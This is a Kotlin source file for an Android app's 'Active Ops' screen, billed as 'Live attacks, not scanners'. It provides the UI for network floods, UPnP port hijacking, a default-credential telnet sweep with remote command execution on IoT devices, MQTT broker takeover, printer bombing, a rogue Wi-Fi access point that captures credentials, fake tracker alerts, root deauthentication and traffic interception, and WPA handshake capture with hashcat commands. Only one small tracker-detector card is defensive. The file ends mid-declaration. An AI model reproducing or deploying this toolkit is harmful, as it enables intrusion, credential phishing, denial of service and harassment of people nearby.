package com.droid.whaly.active

import com.droid.whaly.ButtonFlow
import com.droid.whaly.RootBadge
import com.droid.whaly.ScrollableChipRow

import androidx.compose.foundation.background
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.PaddingValues
import androidx.compose.foundation.layout.Row
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.heightIn
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.verticalScroll
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.automirrored.filled.ArrowBack
import androidx.compose.material3.Button
import androidx.compose.material3.Card
import androidx.compose.material3.CardDefaults
import androidx.compose.material3.FilterChip
import androidx.compose.material3.Icon
import androidx.compose.material3.IconButton
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.OutlinedButton
import androidx.compose.material3.OutlinedTextField
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.runtime.collectAsState
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.rememberCoroutineScope
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.input.KeyboardType
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.unit.dp
import androidx.compose.foundation.text.KeyboardOptions
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.result.contract.ActivityResultContracts
import android.Manifest
import android.content.pm.PackageManager
import android.os.Build
import androidx.compose.runtime.LaunchedEffect
import androidx.core.content.ContextCompat
import com.droid.whaly.RootUtils
import com.droid.whaly.active.root.RootDeauthFlood
import com.droid.whaly.active.root.RootIntercept
import com.droid.whaly.active.root.Scrapper
import kotlinx.coroutines.launch

private enum class ActiveTab(val label: String) {
    NETWORK("Network"),
    PORTAL("Rogue AP"),
    TRACKER("Tracker"),
    SCRAPPER("Scrapper"),
    FLIPPER("Flipper"),
    ROOT("Root"),
}

@Composable
fun ActiveOpsScreen(
    onBack: () -> Unit,
    initialTab: String? = null,
    showRoot: Boolean = false,
) {
    val tabs = remember(showRoot) {
        if (showRoot) ActiveTab.entries else ActiveTab.entries.filter { it != ActiveTab.ROOT }
    }
    var tab by remember(initialTab) {
        mutableStateOf(tabs.firstOrNull { it.name == initialTab } ?: tabs.first())
    }

    Column(Modifier.fillMaxSize()) {
        Row(
            modifier = Modifier
                .fillMaxWidth()
                .padding(start = 4.dp, end = 16.dp, top = 8.dp, bottom = 4.dp),
            verticalAlignment = Alignment.CenterVertically,
        ) {
            IconButton(onClick = onBack) {
                Icon(Icons.AutoMirrored.Filled.ArrowBack, contentDescription = "Back")
            }
            Column {
                Text("Active Ops", style = MaterialTheme.typography.titleLarge, fontWeight = FontWeight.SemiBold)
                Text(
                    "Live attacks, not scanners",
                    style = MaterialTheme.typography.bodySmall,
                    color = MaterialTheme.colorScheme.onSurfaceVariant,
                )
            }
        }

        ScrollableChipRow {
            ActiveTab.entries.forEach { entry ->
                if (entry in tabs) {
                    FilterChip(
                        selected = tab == entry,
                        onClick = { tab = entry },
                        label = {
                            Row(
                                verticalAlignment = Alignment.CenterVertically,
                                horizontalArrangement = Arrangement.spacedBy(4.dp),
                            ) {
                                Text(entry.label, style = MaterialTheme.typography.labelSmall)
                                if (entry == ActiveTab.ROOT) {
                                    RootBadge()
                                }
                            }
                        },
                    )
                }
            }
        }

        when (tab) {
            ActiveTab.NETWORK -> NetworkTab()
            ActiveTab.PORTAL -> PortalTab()
            ActiveTab.TRACKER -> TrackerTab()
            ActiveTab.SCRAPPER -> ScrapperTab()
            ActiveTab.FLIPPER -> FlipperTab()
            ActiveTab.ROOT -> RootTab()
        }
    }
}

// ---------------------------------------------------------------------------------------------

@Composable
private fun NetworkTab() {
    val scope = rememberCoroutineScope()
    val context = LocalContext.current

    val floodPackets by DiscoveryFlood.packets.collectAsState()
    val upnpGateways by UpnpHijack.gateways.collectAsState()
    val upnpLog by UpnpHijack.log.collectAsState()
    val telnetHits by IotTelnetSweep.hits.collectAsState()
    val telnetLog by IotTelnetSweep.log.collectAsState()
    val telnetProgress by IotTelnetSweep.progress.collectAsState()
    val mqttConnected by MqttTakeover.connected.collectAsState()
    val mqttMessages by MqttTakeover.messages.collectAsState()
    val mqttLog by MqttTakeover.log.collectAsState()
    val printTargets by PrintBomb.targets.collectAsState()
    val printLog by PrintBomb.log.collectAsState()

    var externalPort by remember { mutableStateOf("8080") }
    var internalPort by remember { mutableStateOf("8080") }
    var mqttHost by remember { mutableStateOf("") }
    var selectedHit by remember { mutableStateOf<IotTelnetSweep.Hit?>(null) }
    var command by remember { mutableStateOf("id; uname -a") }
    var commandOut by remember { mutableStateOf("") }

    LazyColumn(
        modifier = Modifier.fillMaxSize().padding(horizontal = 16.dp),
        contentPadding = PaddingValues(top = 8.dp, bottom = 160.dp),
        verticalArrangement = Arrangement.spacedBy(12.dp),
    ) {
        // --- discovery flood ---
        item {
            OpsCard("Discovery flood", "SSDP and mDNS packets at 30 ms. Smart-home hubs and TVs drop off the network.") {
                Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                    Button(
                        onClick = {
                            if (DiscoveryFlood.isRunning()) DiscoveryFlood.stop()
                            else DiscoveryFlood.start(DiscoveryFlood.Mode.BOTH)
                        },
                    ) { Text(if (DiscoveryFlood.isRunning()) "Stop" else "Start") }
                    OutlinedButton(onClick = { DiscoveryFlood.start(DiscoveryFlood.Mode.SSDP, 10) }) {
                        Text("SSDP only")
                    }
                }
                Text("packets sent: $floodPackets", style = MaterialTheme.typography.bodySmall)
            }
        }

        // --- UPnP ---
        item {
            OpsCard("UPnP port hijack", "Finds the router's IGD and opens a forward to this phone. Real hole in the perimeter.") {
                Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                    Button(onClick = { scope.launch { UpnpHijack.discover() } }) { Text("Find gateway") }
                }
                upnpGateways.forEach { gateway ->
                    Text(
                        "${gateway.server} · ${gateway.serviceType.substringAfterLast(':')}",
                        style = MaterialTheme.typography.bodySmall,
                    )
                    Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                        OutlinedTextField(
                            value = externalPort,
                            onValueChange = { externalPort = it.filter(Char::isDigit).take(5) },
                            label = { Text("ext") },
                            singleLine = true,
                            modifier = Modifier.weight(1f),
                            keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Number),
                        )
                        OutlinedTextField(
                            value = internalPort,
                            onValueChange = { internalPort = it.filter(Char::isDigit).take(5) },
                            label = { Text("int") },
                            singleLine = true,
                            modifier = Modifier.weight(1f),
                            keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Number),
                        )
                    }
                    Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                        Button(onClick = {
                            scope.launch {
                                UpnpHijack.addMapping(
                                    gateway,
                                    externalPort.toIntOrNull() ?: 8080,
                                    internalPort.toIntOrNull() ?: 8080,
                                )
                            }
                        }) { Text("Map") }
                        OutlinedButton(onClick = {
                            scope.launch {
                                UpnpHijack.removeMapping(gateway, externalPort.toIntOrNull() ?: 8080)
                            }
                        }) { Text("Remove") }
                    }
                }
                LogBlock(upnpLog)
            }
        }

        // --- telnet ---
        item {
            OpsCard("IoT shell sweep", "Telnet on 23/2323/2333 with 17 default credential pairs. Runs commands on a hit.") {
                Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                    Button(onClick = { scope.launch { IotTelnetSweep.sweep() } }) { Text("Sweep /24") }
                    OutlinedButton(onClick = { IotTelnetSweep.stop() }) { Text("Stop") }
                }
                Text(
                    "progress $telnetProgress/254 · ${telnetHits.size} shell(s)",
                    style = MaterialTheme.typography.bodySmall,
                )
                telnetHits.forEach { hit ->
                    Row(
                        Modifier.fillMaxWidth(),
                        verticalAlignment = Alignment.CenterVertically,
                    ) {
                        Text(
                            "${hit.ip}:${hit.port} ${hit.user}/${hit.password}",
                            style = MaterialTheme.typography.bodySmall,
                            modifier = Modifier.weight(1f),
                        )
                        OutlinedButton(onClick = { selectedHit = hit }) { Text("Use") }
                    }
                }
                selectedHit?.let { hit ->
                    OutlinedTextField(
                        value = command,
                        onValueChange = { command = it },
                        label = { Text("command on ${hit.ip}") },
                        singleLine = true,
                        modifier = Modifier.fillMaxWidth(),
                    )
                    Button(onClick = {
                        scope.launch { commandOut = IotTelnetSweep.exec(hit, command) }
                    }) { Text("Run") }
                    if (commandOut.isNotBlank()) {
                        Text(
                            commandOut,
                            style = MaterialTheme.typography.bodySmall,
                            fontFamily = FontFamily.Monospace,
                            modifier = Modifier.heightIn(max = 160.dp).verticalScroll(rememberScrollState()),
                        )
                    }
                }
                LogBlock(telnetLog)
            }
        }

        // --- MQTT ---
        item {
            OpsCard("MQTT broker takeover", "Subscribes to # on an open broker, so every smart-home topic lands here. Publishes back.") {
                Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                    OutlinedTextField(
                        value = mqttHost,
                        onValueChange = { mqttHost = it.trim() },
                        label = { Text("broker ip") },
                        singleLine = true,
                        modifier = Modifier.weight(1f),
                    )
                    Button(onClick = { scope.launch { MqttTakeover.findBrokers() } }) { Text("Find") }
                }
                Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                    Button(onClick = {
                        scope.launch { MqttTakeover.connect(mqttHost.ifBlank { "192.168.1.1" }) }
                    }) { Text(if (mqttConnected) "Reconnect" else "Connect") }
                    OutlinedButton(onClick = { MqttTakeover.disconnect() }) { Text("Close") }
                    OutlinedButton(onClick = {
                        MqttTakeover.publish("whaly/test", "hello from whaly")
                    }) { Text("Publish") }
                }
                Text("${mqttMessages.size} message(s)", style = MaterialTheme.typography.bodySmall)
                mqttMessages.takeLast(12).reversed().forEach { message ->
                    Text(
                        "${message.topic} ← ${message.payload.take(70)}",
                        style = MaterialTheme.typography.bodySmall,
                        fontFamily = FontFamily.Monospace,
                    )
                }
                LogBlock(mqttLog)
            }
        }

        // --- print ---
        item {
            OpsCard("Print bomb", "Discovers IPP printers and pushes a job to every one, repeatedly.") {
                Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                    Button(onClick = { scope.launch { PrintBomb.discover() } }) { Text("Find printers") }
                    OutlinedButton(onClick = {
                        scope.launch {
                            PrintBomb.bomb("WHALY\n\nThis printer was reached over IPP.\n", 5, 3)
                        }
                    }) { Text("Bomb") }
                }
                Text("${printTargets.size} printer(s)", style = MaterialTheme.typography.bodySmall)
                LogBlock(printLog)
            }
        }
    }
}

// ---------------------------------------------------------------------------------------------

@Composable
private fun PortalTab() {
    val context = LocalContext.current
    val ap by RogueApEngine.ap.collectAsState()
    val running by RogueApEngine.running.collectAsState()
    val credentials by RogueApEngine.credentials.collectAsState()
    val log by RogueApEngine.log.collectAsState()

    var ssid by remember { mutableStateOf("Free Airport WiFi") }
    var passphrase by remember { mutableStateOf("12345678") }
    val startAp = PermissionGate(hotspotPermissions()) {
        RogueApEngine.start(context, ssid, passphrase.ifBlank { "12345678" })
    }

    LazyColumn(
        modifier = Modifier.fillMaxSize().padding(horizontal = 16.dp),
        contentPadding = PaddingValues(top = 8.dp, bottom = 160.dp),
        verticalArrangement = Arrangement.spacedBy(12.dp),
    ) {
        item {
            OpsCard(
                "Rogue access point",
                "Starts a local-only hotspot and serves a sign-in portal on it. " +
                    "Credentials typed by anyone who joins land below.",
            ) {
                OutlinedTextField(
                    value = ssid,
                    onValueChange = { ssid = it.take(32) },
                    label = { Text("SSID") },
                    singleLine = true,
                    modifier = Modifier.fillMaxWidth(),
                )
                OutlinedTextField(
                    value = passphrase,
                    onValueChange = { passphrase = it.take(63) },
                    label = { Text("Passphrase (min 8)") },
                    singleLine = true,
                    modifier = Modifier.fillMaxWidth(),
                )
                Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                    Button(onClick = { startAp() }) { Text("Start AP") }
                    OutlinedButton(onClick = { RogueApEngine.stop() }) { Text("Stop") }
                }
                Text(
                    if (running) "AP is broadcasting" else "AP is off",
                    style = MaterialTheme.typography.bodySmall,
                )
            }
        }

        ap?.let { info ->
            item {
                OpsCard("Join details", "Hand these to the target, or scan them from another device.") {
                    KeyValue("SSID", info.ssid)
                    KeyValue("Passphrase", info.passphrase)
                    KeyValue("Portal", info.portalUrl)
                    Text(
                        "The portal is not auto-opened. Without root the phone cannot answer DNS on " +
                            "port 53, so the victim has to type the portal address. With root, run " +
                            "Root intercept and every request lands on it instead.",
                        style = MaterialTheme.typography.bodySmall,
                        color = MaterialTheme.colorScheme.onSurfaceVariant,
                    )
                }
            }
        }

        item {
            OpsCard("Captured", "${credentials.size} submission(s)") {
                if (credentials.isEmpty()) {
                    Text("Nothing yet.", style = MaterialTheme.typography.bodySmall)
                }
                credentials.reversed().forEach { entry ->
                    Text(
                        "${entry.username} : ${entry.password}",
                        style = MaterialTheme.typography.bodySmall,
                        fontFamily = FontFamily.Monospace,
                    )
                }
                LogBlock(log)
            }
        }
    }
}

// ---------------------------------------------------------------------------------------------

@Composable
private fun TrackerTab() {
    val running by TrackerSpoof.running.collectAsState()
    val frames by TrackerSpoof.frames.collectAsState()
    val status by TrackerSpoof.status.collectAsState()
    val log by TrackerSpoof.log.collectAsState()
    var selected by remember { mutableStateOf(TrackerSpoof.Ecosystem.MIXED) }
    val startTracker = PermissionGate(advertisePermissions()) {
        TrackerSpoof.start(selected)
    }

    LazyColumn(
        modifier = Modifier.fillMaxSize().padding(horizontal = 16.dp),
        contentPadding = PaddingValues(top = 8.dp, bottom = 160.dp),
        verticalArrangement = Arrangement.spacedBy(12.dp),
    ) {
        item {
            OpsCard(
                "Tracker impersonation",
                "Emits Find My, SmartTag and Tile frames with a rotating identifier. " +
                    "Nearby phones raise an unwanted-tracking alert and the owner starts hunting a tag that is not there.",
            ) {
                Column(verticalArrangement = Arrangement.spacedBy(6.dp)) {
                    TrackerSpoof.Ecosystem.entries.forEach { eco ->
                        FilterChip(
                            selected = selected == eco,
                            onClick = { selected = eco },
                            label = { Text(eco.label, style = MaterialTheme.typography.labelSmall) },
                        )
                    }
                }
                Text(
                    selected.note,
                    style = MaterialTheme.typography.bodySmall,
                    color = MaterialTheme.colorScheme.onSurfaceVariant,
                )
                Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                    Button(onClick = { if (running) TrackerSpoof.stop() else startTracker() }) {
                        Text(if (running) "Stop" else "Start")
                    }
                }
                Text(status, style = MaterialTheme.typography.bodySmall)
                Text("frames: $frames", style = MaterialTheme.typography.bodySmall)
                LogBlock(log)
            }
        }

        item {
            val detectorRunning by TrackerDetector.running.collectAsState()
            val detectorStatus by TrackerDetector.status.collectAsState()
            val sightings by TrackerDetector.sightings.collectAsState()
            val startScan = PermissionGate(advertisePermissions()) { TrackerDetector.start() }
            OpsCard(
                "Tracker detector",
                "The other direction: listens for Find My, SmartTag and Tile advertisements " +
                    "and flags anything that keeps showing up while you move.",
            ) {
                Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                    Button(onClick = { if (detectorRunning) TrackerDetector.stop() else startScan() }) {
                        Text(if (detectorRunning) "Stop" else "Scan")
                    }
                    OutlinedButton(onClick = { TrackerDetector.clear() }) { Text("Clear") }
                }
                Text(detectorStatus, style = MaterialTheme.typography.bodySmall)
                Text("${sightings.size} tag(s)", style = MaterialTheme.typography.bodySmall)
                sightings.forEach { sighting ->
                    Text(
                        "${sighting.ecosystem}  ${sighting.rssi} dBm  ×${sighting.count}" +
                            if (sighting.following) "  FOLLOWING" else "",
                        style = MaterialTheme.typography.bodySmall,
                        fontFamily = FontFamily.Monospace,
                        color = if (sighting.following) {
                            MaterialTheme.colorScheme.error
                        } else {
                            MaterialTheme.colorScheme.onSurfaceVariant
                        },
                    )
                }
            }
        }
    }
}

// ---------------------------------------------------------------------------------------------

@Composable
private fun RootTab() {
    val context = LocalContext.current
    val scope = rememberCoroutineScope()
    val rooted = remember { RootUtils.isRooted() }

    val deauthCap by RootDeauthFlood.capability.collectAsState()
    val deauthRunning by RootDeauthFlood.running.collectAsState()
    val deauthFrames by RootDeauthFlood.frames.collectAsState()
    val deauthLog by RootDeauthFlood.log.collectAsState()

    val interceptRunning by RootIntercept.running.collectAsState()
    val interceptLog by RootIntercept.log.collectAsState()
    val domains by RootIntercept.domains.collectAsState()
    val captured by RootIntercept.captured.collectAsState()

    var bssid by remember { mutableStateOf("") }
    var channel by remember { mutableStateOf("0") }

    LazyColumn(
        modifier = Modifier.fillMaxSize().padding(horizontal = 16.dp),
        contentPadding = PaddingValues(top = 8.dp, bottom = 160.dp),
        verticalArrangement = Arrangement.spacedBy(12.dp),
    ) {
        if (!rooted) {
            item {
                OpsCard("Root not detected", "Both tools on this tab need a working su binary.") {
                    Text(
                        "Install Magisk or KernelSU, grant Whaly root, then reopen this tab.",
                        style = MaterialTheme.typography.bodySmall,
                    )
                }
            }
        }

        item {
            OpsCard(
                "802.11 deauthentication flood",
                "Kicks every station off an access point. Needs a monitor-mode driver " +
                    "(Nexmon or vendor testmode) plus mdk4, aireplay-ng or nexutil.",
            ) {
                Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                    Button(onClick = { scope.launch { RootDeauthFlood.probe() } }) { Text("Probe") }
                }
                deauthCap?.let { caps ->
                    KeyValue("root", if (caps.rooted) "yes" else "no")
                    KeyValue("monitor mode", if (caps.monitorSupport) "yes" else "no")
                    KeyValue("tool", caps.tool ?: "none")
                    Text(
                        caps.detail,
                        style = MaterialTheme.typography.bodySmall,
                        color = if (caps.monitorSupport && caps.tool != null) {
                            MaterialTheme.colorScheme.onSurfaceVariant
                        } else {
                            MaterialTheme.colorScheme.error
                        },
                    )
                }
                OutlinedTextField(
                    value = bssid,
                    onValueChange = { bssid = it.uppercase().take(17) },
                    label = { Text("BSSID aa:bb:cc:dd:ee:ff") },
                    singleLine = true,
                    modifier = Modifier.fillMaxWidth(),
                )
                OutlinedTextField(
                    value = channel,
                    onValueChange = { channel = it.filter(Char::isDigit).take(3) },
                    label = { Text("channel, 0 = hop") },
                    singleLine = true,
                    modifier = Modifier.fillMaxWidth(),
                    keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Number),
                )
                Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                    Button(onClick = {
                        scope.launch {
                            RootDeauthFlood.start(bssid.ifBlank { "FF:FF:FF:FF:FF:FF" }, channel = channel.toIntOrNull() ?: 0)
                        }
                    }) { Text(if (deauthRunning) "Running" else "Start") }
                    OutlinedButton(onClick = { RootDeauthFlood.stop() }) { Text("Stop") }
                }
                Text("seconds: $deauthFrames", style = MaterialTheme.typography.bodySmall)
                LogBlock(deauthLog)
            }
        }

        item {
            OpsCard(
                "Root traffic intercept",
                "iptables DNAT for DNS and HTTP, plus a hosts-file pin. Every plain request " +
                    "the device makes is terminated here and forwarded onward.",
            ) {
                Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                    Button(onClick = { scope.launch { RootIntercept.start() } }) {
                        Text(if (interceptRunning) "Restart" else "Start")
                    }
                    OutlinedButton(onClick = { RootIntercept.stop() }) { Text("Stop") }
                }
                KeyValue("domains seen", domains.size.toString())
                KeyValue("requests captured", captured.size.toString())
                domains.takeLast(10).reversed().forEach {
                    Text(it, style = MaterialTheme.typography.bodySmall, fontFamily = FontFamily.Monospace)
                }
                captured.takeLast(6).reversed().forEach {
                    Text(
                        "${it.host}${it.path}",
                        style = MaterialTheme.typography.bodySmall,
                        fontFamily = FontFamily.Monospace,
                    )
                }
                LogBlock(interceptLog)
            }
        }
    }
}

// ---------------------------------------------------------------------------------------------

@Composable
private fun ScrapperTab() {
    val scope = rememberCoroutineScope()
    val running by Scrapper.running.collectAsState()
    val frames by Scrapper.frames.collectAsState()
    val devices by Scrapper.devices.collectAsState()
    val aps by Scrapper.aps.collectAsState()
    val dns by Scrapper.dns.collectAsState()
    val handshakes by Scrapper.handshakes.collectAsState()
    val log by Scrapper.log.collectAsState()
    val pcap by Scrapper.pcapPath.collectAsState()
    var channel by remember { mutableStateOf("0") }

    val probed = remember(devices) {
        devices.flatMap { it.probes }.groupingBy { it }.eachCount()
            .entries.sortedByDescending { it.value }.take(12)
    }

    LazyColumn(
        modifier = Modifier.fillMaxSize().padding(horizontal = 16.dp),
        contentPadding = PaddingValues(top = 8.dp, bottom = 160.dp),
        verticalArrangement = Arrangement.spacedBy(12.dp),
    ) {
        item {
            OpsCard(
                "Scrapper",
                "Puts the radio in monitor mode and reads the air. No Wi-Fi connection needed — " +
                    "it is not on any network, it is watching every network at once.",
            ) {
                OutlinedTextField(
                    value = channel,
                    onValueChange = { channel = it.filter(Char::isDigit).take(3) },
                    label = { Text("channel, 0 = hop all") },
                    singleLine = true,
                    modifier = Modifier.fillMaxWidth(),
                    keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Number),
                )
                Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                    Button(onClick = {
                        if (Scrapper.isRunning()) Scrapper.stop()
                        else Scrapper.start(channel.toIntOrNull() ?: 0)
                    }) { Text(if (running) "Stop" else "Start") }
                    OutlinedButton(onClick = { Scrapper.clear() }) { Text("Clear") }
                }
                Text("frames: $frames", style = MaterialTheme.typography.bodySmall)
                KeyValue("devices", devices.size.toString())
                KeyValue("access points", aps.size.toString())
                KeyValue("dns queries", dns.size.toString())
                KeyValue("handshakes", handshakes.size.toString())
                pcap?.let { KeyValue("pcap", it.substringAfterLast('/')) }
                LogBlock(log)
            }
        }

        item {
            OpsCard(
                "What this can and cannot see",
                "Read it once, then the numbers below make sense.",
            ) {
                Text(
                    "Visible: every MAC in range with its vendor, every SSID each device probes " +
                        "for — that is the saved-network list of every phone around you — every " +
                        "beacon and probe response with channel, encryption and WPS, and DNS " +
                        "queries on open networks.",
                    style = MaterialTheme.typography.bodySmall,
                )
                Spacer(Modifier.height(6.dp))
                Text(
                    "Not visible: the contents of WPA2 traffic. Those payloads are encrypted " +
                        "between the device and its access point, and a passive radio is not " +
                        "part of that key exchange. Anyone claiming otherwise is selling " +
                        "something. To read the payload you have to be the access point, which " +
                        "is what the Rogue AP tab is for.",
                    style = MaterialTheme.typography.bodySmall,
                    color = MaterialTheme.colorScheme.onSurfaceVariant,
                )
            }
        }

        if (probed.isNotEmpty()) {
            item {
                OpsCard(
                    "KARMA candidates",
                    "SSIDs that devices around you are asking for. Feed the top one to the Rogue AP " +
                        "tab and those devices try to join it automatically.",
                ) {
                    probed.forEach { (ssid, count) ->
                        Row(Modifier.fillMaxWidth(), verticalAlignment = Alignment.CenterVertically) {
                            Text(
                                "$ssid",
                                style = MaterialTheme.typography.bodySmall,
                                modifier = Modifier.weight(1f),
                                fontFamily = FontFamily.Monospace,
                            )
                            Text(
                                "×$count",
                                style = MaterialTheme.typography.labelSmall,
                                color = MaterialTheme.colorScheme.primary,
                            )
                        }
                    }
                }
            }
        }

        if (devices.isNotEmpty()) {
            item {
                OpsCard("Devices in range", "${devices.size} station(s), strongest first") {
                    devices.take(40).forEach { device ->
                        Column(Modifier.padding(vertical = 4.dp)) {
                            Text(
                                "${device.mac}  ${device.rssi} dBm",
                                style = MaterialTheme.typography.bodySmall,
                                fontFamily = FontFamily.Monospace,
                            )
                            Text(
                                "${device.vendor} · ${device.kind.name.lowercase()} · ${device.packets} frames",
                                style = MaterialTheme.typography.labelSmall,
                                color = MaterialTheme.colorScheme.onSurfaceVariant,
                            )
                            if (device.probes.isNotEmpty()) {
                                Text(
                                    "probes: " + device.probes.take(6).joinToString(", "),
                                    style = MaterialTheme.typography.labelSmall,
                                    color = MaterialTheme.colorScheme.primary,
                                )
                            }
                        }
                    }
                }
            }
        }

        if (aps.isNotEmpty()) {
            item {
                OpsCard("Access points", "${aps.size} beacon(s)") {
                    aps.take(40).forEach { ap ->
                        Text(
                            "${ap.ssid}  ${ap.channel}ch  ${ap.rssi}dBm  " +
                                (if (ap.encrypted) "WPA" else "OPEN") + (if (ap.wps) " WPS" else ""),
                            style = MaterialTheme.typography.bodySmall,
                            fontFamily = FontFamily.Monospace,
                            color = if (!ap.encrypted) MaterialTheme.colorScheme.error
                            else MaterialTheme.colorScheme.onSurfaceVariant,
                        )
                    }
                }
            }
        }

        if (dns.isNotEmpty()) {
            item {
                OpsCard("DNS seen", "Only from open networks — WPA2 hides the payload") {
                    dns.takeLast(40).reversed().forEach { hit ->
                        Text(
                            "${hit.query}  ← ${hit.client.takeLast(5)}",
                            style = MaterialTheme.typography.labelSmall,
                            fontFamily = FontFamily.Monospace,
                        )
                    }
                }
            }
        }

        if (handshakes.isNotEmpty()) {
            item {
                OpsCard(
                    "EAPOL / PMKID",
                    "A complete 4-way handshake or a PMKID is the material hashcat needs. " +
                        "The pcap already holds the frames.",
                ) {
                    handshakes.forEach { shake ->
                        Column(Modifier.padding(vertical = 4.dp)) {
                            Text(
                                shake.bssid + "  ←  " + shake.station,
                                style = MaterialTheme.typography.bodySmall,
                                fontFamily = FontFamily.Monospace,
                                color = MaterialTheme.colorScheme.primary,
                            )
                            Text(
                                "messages " + shake.messages.sorted().joinToString("/") +
                                    if (shake.complete) "  COMPLETE" else "",
                                style = MaterialTheme.typography.labelSmall,
                            )
                            shake.pmkid?.let {
                                Text(
                                    "pmkid $it",
                                    style = MaterialTheme.typography.labelSmall,
                                    fontFamily = FontFamily.Monospace,
                                    color = MaterialTheme.colorScheme.error,
                                )
                            }
                        }
                    }
                    Text(
                        "Take the pcap to hashcat: hcxpcapngtool -o hash.22000 capture.pcap, " +
                            "then hashcat -m 22000 hash.22000 wordlist.",
                        style = MaterialTheme.typography.labelSmall,
                        color = MaterialTheme.colorScheme.onSurfaceVariant,
                    )
                }
            }
        }
    }
}

// ---------------------------------------------------------------------------------------------

@Composable
private fun FlipperTab() {
    val context = LocalContext.current
    val irRunning by TvBGone.running.collectAsState()
    val irIndex by TvBGone.index.collectAsState()
    val irLog by TvBGone.log.collectAsState()
    val beaconRunning by BeaconSpam.running.collectAsState()
    val beaconCount by BeaconSpam.count.collectAsState()
    val beaconStatus by BeaconSpam.status.collectAsState()
    var format by remember { mutableStateOf(BeaconSpam.Format.IBEACON) }
    var names by remember { mutableStateOf("Whaly\nFree WiFi\nAirport\nStarbucks\nHOME-2.4G") }
    val startBeacon = PermissionGate(advertisePermissions()) {
        BeaconSpam.start(format, names.lines().map { it.trim() }.filter { it.isNotEmpty() })
    }

    LazyColumn(
        modifier = Modifier.fillMaxSize().padding(horizontal = 16.dp),
        contentPadding = PaddingValues(top = 8.dp, bottom = 160.dp),
        verticalArrangement = Arrangement.spacedBy(12.dp),
    ) {
        item {
            OpsCard(
                "TV-B-Gone",
                "Fires the power toggle for 18 television families. Something in the room turns off.",
            ) {
                Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                    Button(onClick = { TvBGone.fire(context, rounds = 2) }) { Text("Fire") }
                    OutlinedButton(onClick = { TvBGone.stop() }) { Text("Stop") }
                }
                Text(
                    if (irRunning) "code ${irIndex + 1}/${TvBGone.codes.size}" else "idle",
                    style = MaterialTheme.typography.bodySmall,
                )
                LogBlock(irLog)
            }
        }

        item {
            OpsCard(
                "Beacon spam",
                "iBeacon, Eddystone and AltBeacon frames with names you pick. Every phone in " +
                    "range sees them in its scan list.",
            ) {
                Column(verticalArrangement = Arrangement.spacedBy(6.dp)) {
                    BeaconSpam.Format.entries.forEach { entry ->
                        FilterChip(
                            selected = format == entry,
                            onClick = { format = entry },
                            label = { Text(entry.label, style = MaterialTheme.typography.labelSmall) },
                        )
                    }
                }
                OutlinedTextField(
                    value = names,
                    onValueChange = { names = it },
                    label = { Text("names, one per line") },
                    modifier = Modifier.fillMaxWidth(),
                    minLines = 3,
                )
                Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                    Button(onClick = { if (beaconRunning) BeaconSpam.stop() else startBeacon() }) {
                        Text(if (beaconRunning) "Stop" else "Start")
                    }
                }
                Text(beaconStatus, style = MaterialTheme.typography.bodySmall)
                Text("frames: $beaconCount", style = MaterialTheme.typography.bodySmall)
            }
        }

        item {
            OpsCard("From the Flipper, on a phone", "What maps cleanly and what does not.") {
                Text(
                    "Works here: NFC read/write/emulate, IR blaster, Bad USB over HID, BLE spam, " +
                        "beacon spam, tracker detect and spoof, Wi-Fi monitor capture and deauth " +
                        "with root.",
                    style = MaterialTheme.typography.bodySmall,
                )
                Spacer(Modifier.height(6.dp))
                Text(
                    "Needs hardware this phone does not have: Sub-GHz 433/315/868 MHz, 125 kHz " +
                        "RFID, iButton, GPIO, MagSpoof. Those are radio front ends, not software.",
                    style = MaterialTheme.typography.bodySmall,
                    color = MaterialTheme.colorScheme.onSurfaceVariant,
                )
            }
        }
    }
}

// ---------------------------------------------------------------------------------------------

@Composable
private fun OpsCard(title: String, subtitle: String, content: @Composable () -> Unit) {
    Card(
        modifier = Modifier.fillMaxWidth(),
        shape = RoundedCornerShape(18.dp),
        colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surfaceContainerHigh),
    ) {
        Column(
            modifier = Modifier.padding(16.dp),
            verticalArrangement = Arrangement.spacedBy(8.dp),
        ) {
            Text(title, style = MaterialTheme.typography.titleSmall, fontWeight = FontWeight.SemiBold)
            Text(
                subtitle,
                style = MaterialTheme.typography.bodySmall,
                color = MaterialTheme.colorScheme.onSurfaceVariant,
            )
            content()
        }
    }
}

@Composable
